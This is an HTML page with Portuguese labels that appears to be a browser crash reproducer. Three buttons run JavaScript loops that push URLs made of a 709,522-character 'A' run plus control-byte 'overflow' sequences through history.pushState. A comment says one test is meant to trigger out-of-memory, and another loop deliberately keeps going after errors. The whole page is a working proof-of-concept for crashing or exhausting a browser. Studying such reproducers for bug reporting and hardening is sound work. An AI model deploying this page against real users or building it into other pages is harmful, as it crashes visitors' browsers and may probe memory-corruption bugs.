<!DOCTYPE html>
<html>
<head>
    <title>REPLICA EXATA (6-3-1)</title>
    <style>
        body { background-color: #000; color: #0f0; font-family: monospace; padding: 20px; }
        #log { border: 1px solid #333; padding: 10px; height: 450px; overflow-y: scroll; white-space: pre-wrap; font-size: 14px;}
        .btn { 
            padding: 15px; font-size: 1.2em; cursor: pointer; 
            background: #111; color: #fff; border: 1px solid #0f0; margin: 5px; width: 100%;
        }
        .btn:hover { background: #222; }
    </style>
</head>
<body>

<h1>REPLICA 100% FIEL (SEM MODIFICAÇÕES)</h1>
<p>Sequência: Teste 6 -> Teste 3 -> Teste 1</p>

<button class="btn" onclick="runTest6()">1. TESTE 6 (Incremental Original)</button>
<button class="btn" onclick="runTest3()">2. TESTE 3 (Padrões Original)</button>
<button class="btn" onclick="runTest1()" style="border-color: red; color: red;">3. TESTE 1 (Byte Map Original)</button>

<div id="log">Aguardando...</div>

<script>
    // Constante original
    const BASE_OFFSET = 709522; 

    function log(msg) {
        const el = document.getElementById('log');
        el.innerHTML += `<div>[${new Date().toLocaleTimeString()}] ${msg}</div>`;
        el.scrollTop = el.scrollHeight;
    }

    async function wait(ms) { return new Promise(r => setTimeout(r, ms)); }

    // ======================================================
    // TESTE 6: LÓGICA ORIGINAL (step 5000)
    // ======================================================
    async function runTest6() {
        log("=== TESTE 6 ORIGINAL ===");
        
        // Parâmetros originais do seu input
        const start = 1000;
        const step = 5000;
        // Você mencionou que ele foi até ~46000 no sucesso
        
        for(let currentSize = start; currentSize <= 50000; currentSize += step) {
            try {
                const base = "A".repeat(BASE_OFFSET);
                
                // Lógica original: charCode(j % 33)
                let overflow = "";
                for (let j = 0; j < currentSize; j++) {
                    overflow += String.fromCharCode(j % 33);
                }
                
                const payload = "/" + base + overflow;
                
                history.pushState({}, `inc_${currentSize}`, payload);
                log(`SUCESSO com ${currentSize} bytes`);
                
                await wait(200); // Pequeno delay apenas para não travar a UI instantaneamente
            } catch(e) {
                log(`CRASH em ${currentSize} bytes: ${e.message}`);
                break;
            }
        }
        log("Teste 6 Finalizado.");
    }

    // ======================================================
    // TESTE 3: LÓGICA ORIGINAL (Sequências Fixas)
    // ======================================================
    async function runTest3() {
        log("=== TESTE 3 ORIGINAL ===");

        const sequences = [
            { name: "Null-terminated", bytes: [0x00, 0x00, 0x00, 0x00] },
            { name: "Newlines", bytes: [0x0A, 0x0A, 0x0A, 0x0A] },
            { name: "Tabs", bytes: [0x09, 0x09, 0x09, 0x09] },
            { name: "Carriage Return", bytes: [0x0D, 0x0D, 0x0D, 0x0D] },
            { name: "Space", bytes: [0x20, 0x20, 0x20, 0x20] },
            { name: "Mixed Control", bytes: [0x00, 0x09, 0x0A, 0x0D, 0x20] },
            { name: "ASCII Control", bytes: [0x01, 0x02, 0x03, 0x04, 0x05] },
            { name: "Bell/Backspace", bytes: [0x07, 0x08, 0x08, 0x07] }
        ];

        for (let seq of sequences) {
            try {
                const base = "A".repeat(BASE_OFFSET);
                
                // Lógica original: Repetir a sequência 1000 vezes
                let overflow = "";
                for (let i = 0; i < 1000; i++) {
                    for (let byte of seq.bytes) {
                        overflow += String.fromCharCode(byte);
                    }
                }
                
                const payload = "/" + base + overflow;
                
                history.pushState({}, seq.name.replace(/\s/g, '_'), payload);
                log(`SUCESSO: ${seq.name}`);
                await wait(100);

            } catch(e) {
                log(`CRASH: ${seq.name} - ${e.message}`);
            }
        }
        log("Teste 3 Finalizado.");
    }

    // ======================================================
    // TESTE 1: LÓGICA ORIGINAL (Byte Map Simples)
    // ======================================================
    async function runTest1() {
        log("=== TESTE 1 ORIGINAL (0x00 - 0xFF) ===");
        log("Este teste deve causar o OOM se a memória estiver cheia.");
        
        // Loop simples de 0 a 255. Sem loops externos.
        for (let byte = 0x00; byte <= 0xFF; byte++) {
            try {
                const base = "A".repeat(BASE_OFFSET);
                const testByte = String.fromCharCode(byte);
                
                // Lógica original: repeat(100)
                const overflow = testByte.repeat(100); 
                
                const payload = "/" + base + overflow;
                
                history.pushState({}, `test_${byte}`, payload);
                
                // Feedback visual mínimo
                if (byte % 16 === 0) {
                   log(`Testando 0x${byte.toString(16)}... OK`);
                   await wait(10); // Pausa mínima para a UI atualizar e permitir o clique em Cancelar
                }
                
            } catch(e) {
                log(`CRASH em 0x${byte.toString(16)}: ${e.message}`);
                // Não paramos o loop aqui propositalmente para forçar a UI a mostrar o alerta,
                // exatamente como no comportamento manual.
            }
        }
        log("Teste 1 Finalizado.");
    }
</script>
</body>
</html>
